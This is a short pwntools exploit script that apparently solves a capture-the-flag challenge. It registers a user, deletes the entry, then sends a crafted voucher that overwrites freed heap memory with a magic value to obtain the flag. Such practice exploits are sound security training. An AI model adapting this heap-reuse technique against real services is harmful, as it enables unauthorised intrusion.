from pwn import *

context.terminal = ['gnome-terminal', '--', 'bash', '-c']
elf = context.binary = ELF('../public/hot')

remote_addr = args.REMOTE_ADDR or 'localhost'
remote_port = args.REMOTE_PORT or 1337

if args.LOCAL:
    r = process()
else:
    r = remote(remote_addr, remote_port)

if args.LOCAL and not args.NO_GDB:
    gdb.attach(r)

magic_value = 0x7a707a65
magic_offset = 64
registration_size = 72

voucher_payload = fit(
        b'A'*magic_offset,
        p32(magic_value),
        # Accounting for the final newline that needs to be sent for fgets to return
        length=registration_size - 2,
        filler=b'B'
        )

r.sendlineafter('Please pick the desired option: ', '1')
r.sendlineafter('Name: ', 'test')
r.sendlineafter('Email: ', 'test@test.com')
print('sent info')

r.sendlineafter('Please pick the desired option: ', '3')
print('deleted')

r.sendlineafter('Please pick the desired option: ', '4')
print('ready to send voucher')
print(voucher_payload)
r.sendlineafter('Please enter voucher: ', voucher_payload)
print('sent voucher')

print(r.sendlineafter('Please pick the desired option: ', '5'))
### print(r.clean())
print('requested flag')

print(r.recv())

# r.interactive()

r.close()
